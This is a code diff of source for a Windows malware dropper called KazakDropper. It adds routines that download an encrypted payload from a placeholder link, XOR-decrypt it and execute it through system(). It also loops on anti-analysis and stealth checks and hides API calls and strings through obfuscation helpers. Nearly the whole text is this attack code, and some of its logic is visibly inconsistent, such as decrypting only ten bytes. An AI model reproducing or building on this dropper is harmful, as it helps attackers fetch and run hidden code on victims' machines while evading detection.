@@ -71,43 +71,66 @@ void KazakDropper::Stealth()
 	std::this_thread::sleep_for(std::chrono::seconds(5));
 }
 
-std::string KazakUtils::FileToString(std::wstring URL)
+std::string KazakUtils::replace_all(std::string subject, const std::string& search, const std::string& replace)
 {
-	const wchar_t* header = enc(L"Accept: *" "/" "*\r\n\r\n");
-	HANDLE hInterWebz = InternetOpenA(enc("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
-	HANDLE hURL = li(InternetOpenUrl)(hInterWebz, URL.c_str(), header, lstrlen(header), INTERNET_FLAG_DONT_CACHE, 0);
-
-	char* Buffer = new char[100000000]; //100mb
-	memset(Buffer, 0, 100000000);
-	DWORD BytesRead = 1;
-
-	std::string data;
-
-	if (li(InternetReadFile)(hURL, Buffer, 100000000, &BytesRead))
+	size_t pos = 0;
+	while ((pos = subject.find(search, pos)) != std::string::npos)
 	{
-		data = std::string(Buffer);
+		subject.replace(pos, search.length(), replace);
+		pos += replace.length();
 	}
-
-	delete[] Buffer;
-	li(InternetCloseHandle)(hInterWebz);
-	li(InternetCloseHandle)(hURL);
-
-	return data;
+	return subject;
 }
 
-void KazakDropper::PrepareExe()
+std::string KazakUtils::StringWrapper(const std::string url)
+{
+	const HINTERNET connection = li(InternetOpenA)(enc("list_access\r\n"), INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, NULL);
+	std::string rtn;
+	if (connection)
+	{
+		const HINTERNET url_file = li(InternetOpenUrlA)(connection, url.c_str(), nullptr, NULL, NULL, NULL);
+		if (url_file)
+		{
+			char buffer[2000];
+			DWORD bytes_read;
+			do
+			{
+				li(InternetReadFile)(url_file, buffer, 2000, &bytes_read);
+				rtn.append(buffer, bytes_read);
+				memset(buffer, 0, 2000);
+			} while (bytes_read);
+			li(InternetCloseHandle)(connection);
+			li(InternetCloseHandle)(url_file);
+			std::string p = KazakUtils::replace_all(rtn, "|n", "\r\n");
+			return p;
+		}
+	}
+	li(InternetCloseHandle)(connection);
+	std::string p = KazakUtils::replace_all(rtn, "|n", "\r\n");
+	return p;
+}
+
+void KazakDropper::PreparePayload()
 {
 	Storage S;
-	S.BytesStorage = KazakUtils::FileToString(enc(L"link to the raw link where the bytes are stored"));
-	S.Key = enc("KazakDropper");
+
+	S.PayloadLink = enc("RAW PAYLOAD LINK");
+	S.EncryptedPayload = KazakUtils::StringWrapper(S.PayloadLink);
 
 	for (int x = 0; x < 10; x++)
-		S.DecryptedBytes[x] = S.BytesStorage[x] ^ S.Key[x];
-	
+		S.DecryptedPayload[x] = S.EncryptedPayload[x] ^ S.XorKey[x];
+
+}
+
+void KazakDropper::DropPayload(std::string payload)
+{
+	li(system)(payload.c_str());
 }
 
 int main()
 {
+	Storage S;
+
 	while (!KazakDropper::EvadeAnalysis())
 	{
 		KazakDropper::Stealth();
@@ -116,9 +139,11 @@ int main()
 			Sleep(1000);
 
 
-		KazakDropper::PrepareExe();
+		KazakDropper::PreparePayload();
+		
+		KazakDropper::DropPayload(S.DecryptedPayload);
 
-
+		return 0;
 
 	}
 
